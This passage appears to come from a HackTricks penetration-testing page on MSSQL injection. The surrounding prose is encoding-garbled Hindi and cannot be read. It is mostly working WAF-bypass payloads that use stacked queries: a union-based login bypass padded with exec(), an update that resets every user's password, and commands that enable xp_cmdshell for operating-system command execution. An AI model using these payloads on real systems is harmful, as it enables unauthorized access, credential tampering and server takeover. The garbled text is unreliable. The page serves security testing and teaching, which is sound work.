<p>рдЗрди рд╕рд░реНрд╡реЛрддреНрддрдо рдкреНрд░рдерд╛рдУрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдХреЗ, рдЖрдк MSSQL Injection рд╣рдорд▓реЛрдВ рдХреЗ рдЬреЛрдЦрд┐рдо рдХреЛ рдХрд╛рдлреА рдХрдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдирдзрд┐рдХреГрдд рдкрд╣реБрдВрдЪ рд╕реЗ рдЕрдкрдиреЗ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдФрд░ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред</p>
```
```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```
рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рд╡рд┐рднрд┐рдиреНрди WAFs рдХреЛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╕реНрдЯреИрдХрд┐рдВрдЧ рдХреНрд╡реЗрд░реА рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рдирд╣реАрдВ рд░рдЦрддреЗ рд╣реБрдП рдмрд╛рдИрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```
# Adding a useless exec() at the end and making the WAF think this isn't a valid querie
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```
## рд╕рдВрджрд░реНрдн

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PR рдЬрдорд╛ рдХрд░рдХреЗ** [**hacktricks рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud рд░реЗрдкреЛ**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛ**ред

</details>
